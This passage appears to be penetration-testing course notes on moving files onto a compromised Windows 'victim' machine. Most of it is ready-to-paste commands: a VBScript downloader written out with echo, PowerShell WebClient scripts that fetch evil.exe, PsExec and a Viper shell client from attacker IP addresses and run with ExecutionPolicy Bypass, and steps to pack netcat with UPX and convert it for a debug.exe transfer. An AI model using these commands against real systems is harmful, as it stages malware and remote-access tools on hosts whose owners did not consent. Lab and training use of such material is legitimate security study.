echo strBuffer = "" >> wget.vbs

echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs

echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs

echo Next >> wget.vbs

echo ts.Close >> wget.vbs

Now, we can serve files on our own web server, and download them to the victim

machine with ease:

C:\Users\Offsec>cscript wget.vbs http://10.11.0.5/evil.exe evil.exe

#### UPLOADING FILE USING POWERSHELL

C:\Users\Offsec> echo $storageDir = $pwd > wget.ps1

C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1

C:\Users\Offsec> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1

C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1

C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

Now, we can use PowerShell to run the script and download our file:

C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

#### POWERSHELL TRANSFER PSEXEC

•	You will have to uplaod PsExec

•	echo $storageDir = $pwd > psewget.ps1

•	echo $webclient = New-Object System.Net.WebClient >>psewget.ps1

•	echo $url = "http://10.11.0.69/PsExec.exe" >>psewget.ps1

•	echo $file = "PsExec.exe" >>psewget.ps1

•	echo $webclient.DownloadFile($url,$file) >>psewget.ps1

•	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File psewget.ps1

#### POWERSHELL TRANSFER VIPER-SHELL

•	echo $storageDir = $pwd > viperwget.ps1

•	echo $webclient = New-Object System.Net.WebClient >>viperwget.ps1

•	echo $url = "http://10.11.0.202/ViperClient.exe" >>viperwget.ps1

•	echo $file = "ViperClient.exe" >>viperwget.ps1

•	echo $webclient.DownloadFile($url,$file) >>viperwget.ps1


•	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File viperwget.ps1

#### USING DEBUG.EXE TO TRANSFER FILES

There is a 64k byte size limit to the files that can be created by debug.exe

root@kali:~# locate nc.exe|grep binaries

/usr/share/windows-binaries/nc.exe

root@kali:~# cp /usr/share/windows-binaries/nc.exe .

root@kali:~# ls -l nc.exe

-rwxr-xr-x 1 root root 59392 Apr 11 05:13 nc.exe

root@kali:~# upx -9 nc.exe

root@kali:~# ls -l nc.exe

-rwxr-xr-x 1 root root 29184 Apr 11 05:13 nc.exe

root@kali:~# locate exe2bat

/usr/share/windows-binaries/exe2bat.exe

root@kali:~# cp /usr/share/windows-binaries/exe2bat.exe .

root@kali:~# wine exe2bat.exe nc.exe nc.txt

Finished: nc.exe > nc.txt

root@kali:~# head nc.txt

Now copy and paste the hex code into the c:\ on the target machine

